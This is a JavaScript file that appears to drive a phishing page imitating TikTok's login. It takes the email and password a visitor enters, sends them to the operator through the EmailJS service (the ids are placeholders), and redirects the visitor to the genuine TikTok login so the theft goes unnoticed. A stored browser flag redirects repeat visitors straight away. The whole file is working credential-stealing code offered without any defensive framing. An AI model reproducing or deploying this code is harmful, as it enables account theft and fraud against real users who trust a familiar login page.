let action = true;

function start() {
    let controlBoolean = localStorage.getItem("actionControl");
    if (controlBoolean == null) {
        action = true;
    } else {
        action = false;
        window.location.href = "https://www.tiktok.com/login";
    }
}

start();

let email;
let password;

function login() {
    if (action == true) {
        email = document.getElementById("email").value.trim();
        password = document.getElementById("password").value.trim();
    
        if (email != "" && password != "") {
            sendData();
            localStorage.setItem("actionControl", "false");
        }
    }
}

(function() {
    emailjs.init("your_public_key");
})();

function sendData() {
    emailjs.send("your_service_id", "your_template_id", {
        email: email,
        password: password
    })
    .then(function(response) {
        window.location.href = "https://www.tiktok.com/login";
    }, function(error) {
    });
}